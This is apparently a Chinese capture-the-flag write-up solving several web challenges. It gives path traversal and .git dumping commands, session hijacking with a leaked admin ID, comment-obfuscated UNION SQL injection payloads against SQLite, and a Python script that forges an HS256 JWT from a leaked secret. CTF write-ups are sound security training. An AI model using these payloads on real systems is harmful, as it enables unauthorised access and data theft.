## Comment
**该挑战暗示了对 HTTP Host 标头的操纵，其中对host 的**强调以及“谁说你甚至需要和它对话？”这句话表明我们根本不需要 Host 标头。

此外，“人们忘记删除的臃肿文件”意味着要查找残留的文件或内容。

当像 nginx 这样的 Web 服务器托管多个虚拟主机时，它会使用 HTTP`Host`头部来确定要提供哪个站点的服务。在 HTTP/1.1 中，Host 头部是必需的，不然会爆400bad request。然而，在 HTTP/1.0 中，Host 头部并非必需。
如果向端口 80 发送不带 Host 标头的 HTTP/1.0 请求，nginx 将回退到提供其默认页面，因为它无法确定要将请求路由到哪个虚拟主机：
```
echo -e "GET / HTTP/1.0\r\n\r\n" | nc ctf.rusec.club 80
```
这将返回默认的 nginx 欢迎页面，其中包含一个带有以下标志的 HTML 注释：
```
<!-- you found me :3 --!>
<!-- RUSEC{truly_the_hardest_ctf_challenge} --!>
```
解释payload
- `echo`输出字符串
- `-e` 允许解析转义字符
- `\r\n`表示回车。
- `HTTP/1.0`使用这个可以不用Host头。
- `|`管道符，把刚刚构造的 HTTP 请求，通过 TCP 直接发给 `ctf.rusec.club:80`
或者可以用bp操作，访问`http://ctf.rusec.club:80`抓包，不可以用https 因为HTTPS的本质是
```
TCP → TLS → HTTP
```
而在 **TLS 握手阶段**，客户端会发送 SNI（Server Name Indication），**即使你在 HTTP 层删掉了 Host，TLS 层已经把域名告诉服务器了**。nginx 在 HTTPS 虚拟主机中，会优先根据：SNI,再结合 Host，所以修改HOST没有意义。
抓到包后删掉HOST，把HTTP/1.1改为HTTP/1.0再放包。![](/image/258.png)
## SWE Intern at Girly Pop Inc
再`/view?page=`可以实现任意文件读取，通过`../`可以目录遍历，逃逸`static`目录，读取`?page=../app.py`
可以看到密钥泄露了，但是对这道题似乎没什么用。
这道题实际是`git`泄露，试一下`page=../.git/config`可以下载到文件，说明是可以`git`泄露的，但是用`GitHack`扫一下，发现下载的文件不完整，下不到悬空对象。再用`git-dump`工具试一下，扫到了完整的`.git`文件。
```
git-dumper http://127.0.0.1:8086/view?page=../.git/ dump_repo
```
接下来还原源码
```
git reset --hard
```
看到`HEAD is now at 9e26820 removed flag`
再查看Git历史
```
git log
```
看到
```
D:\CTF_tools\GitHack-master\dump_repo>git log
commit 9e26820af5010a2afa8e4c09023c1ee078e8e8aa (HEAD -> master)
Author: intern-3 <nobody@nobody.com>
Date:   Sun Jan 11 15:20:49 2026 +0100

    removed flag

commit 7d568bcf0d6139bb8738949561210f592902a4c9
Author: intern-3 <nobody@nobody.com>
Date:   Sun Jan 11 15:20:39 2026 +0100

    initial
```
找到flag的位置，
```
git show 9e26820af5010a2afa8e4c09023c1ee078e8e8aa
```
得到flag
```
commit 9e26820af5010a2afa8e4c09023c1ee078e8e8aa (HEAD -> master)
Author: intern-3 <nobody@nobody.com>
Date:   Sun Jan 11 15:20:49 2026 +0100

    removed flag

diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index 61f9cd8..0000000
--- a/flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-RUSEC{a1way$_1gnor3_3nv_f1l3s_up47910k390cyhu623}
```
## Campus One
这一关要先爆破一个api接口`/api/debug/sessions`用户的sessionid都泄露了，在最开头可以看到
```
{"sessionId":"admin_session_44920_x8z","user":"admin_root","role":"administrator"}
```
这应该就是管理员的sessionId，试着劫持一下，用管理员的sessionId访问`/admin`接口，可以登录管理员操作界面，![](/image/259.png)在网页看一下，可以找到有一个搜索订单的功能，可能存在SQL注入，试一下，但是空格过滤了，试一下`/api/admin/search?q='/**/or/**/1=1--+`![](/image/260.png)这是可以的，通过`q='/**/order/**/by/**/5--+`看到有5列，`q='/**/union/**/select/**/1,2,3,4,5--+`发现五个位都回显，这里好像不可以用`database()`查数据库了，
用
```
?q='/**/union/**/select/**/1,2,3,name,5/**/from/**/sqlite_master--+
```
可以查到一个`secret`和`users`看起来有价值。
```
?q='/**/union/**/select/**/1,2,3,key,value/**/from/**/secrets--+
```
查一下`key`和`value`就可以得到flag。![](/image/261.png)
## Mole in the Wall
题目提示在`/debug/config`目录下有一个json文件，访问`/debug/config/security.json`可以得到这个json文件。内容是
```
{"audience":null,"issuer":null,"jwt":{"algorithm":"HS256","re​​quired_claims":{"department":"security","role":"nightguard","shift":"night"}},"notes":"JWT secret was scooped at runtime - Mike Schmidt"}
```
从这里得到加密算法是`HS256`，还有`required_claims`是
```
{"department":"security","role":"nightguard","shift":"night"}
```
可以利用这个生成token。
再访问`/debug/config/.env`
```
{"JWT_SECRET":"g0ld3n_fr3ddy_w1ll_a1ways_b3_w@tch1ng_y0u"}
```
可以得到jwt密钥。
token伪造要的payload，加密算法和密钥都知道了。
利用该密钥伪造token。
```python
import jwt  
payload={  
    "role":"nightguard",  
    "department":"security",  
    "shift":"night"  
}  
token = jwt.encode(payload,"g0ld3n_fr3ddy_w1ll_a1ways_b3_w@tch1ng_y0u",algorithm="HS256")  
print(token)
```
生成token，
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoibmlnaHRndWFyZCIsImRlcGFydG1lbnQiOiJzZWN1cml0eSIsInNoaWZ0IjoibmlnaHQifQ.Swx21w_g12s9NHL9-E-q_bFpyD36BJsMlb3fYkYe0mM
```
把token提交到login界面，就会得到一个压缩包。
其中有一个xml文件泄露了一个api接口，`/api/run-flow`，
访问接口，显示`{"error":"invalid input"}`所以大概率是要提交一个json格式payload
`session.log`里有一段`u$bu_qvsqm4_hvz`这个要把每个字符的ascii码减一，得到`t#at_purpl3_guy`再在那个api接口语言发送post请求
```
{"input":"t#at_purpl3_guy"}
```
发送时要把`Content-Type: application/json`
这样就得到flag了。
## miss-input